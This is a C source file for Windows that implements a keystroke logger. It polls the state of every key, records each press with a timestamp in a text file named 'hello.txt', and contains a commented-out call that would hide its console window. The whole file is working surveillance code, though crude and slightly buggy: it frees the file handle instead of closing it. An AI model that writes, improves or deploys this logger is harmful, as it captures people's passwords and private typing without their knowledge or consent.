#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <windows.h>
#include <stdbool.h>
#include <signal.h>
#include <ctype.h>
#include <unistd.h>
#include "keyboard.h"
#include "clocktime.h"
#include "winvk.h"

#define TICK 5
#define FILENAME "hello.txt"
#define WRITE "w"
#define DEFAULT_RES "KeyPressed: \"%c\" -- %s\n"

FILE *f = NULL;

void SIGNAL_freeFile()
{
    free(f);
}
void sendToFile(const char keyPressed)
{
    if (f == NULL)
    {
        exit(0);
    }

    pDATE date = getFullDateAsString();
    fprintf(f, DEFAULT_RES, keyPressed, date);
    freeDate(date);
}
void setup()
{
    setlocale(LC_ALL, "");
    // FreeConsole();
    f = fopen(FILENAME, WRITE);
    signal(SIGSEGV, SIGNAL_freeFile);
    signal(SIGINT, SIGNAL_freeFile);
}

void running()
{
    char key_pressed;
    while (1)
    {
        Sleep(5);
        for (int i = 0; i < sizeof(WINKEYCODES_ARRAY) / sizeof(int); i++)
        {
            if (GetAsyncKeyState(WINKEYCODES_ARRAY[i]) & 0x01)
            {
                key_pressed = tolower(WINKEYCODES_ARRAY[i]);

                puts("Tecla pressionada.");
                sendToFile(key_pressed);
            }
        }
    }
}

int main(void)
{
    setup();
    running();
    system("pause");
    return 0;
}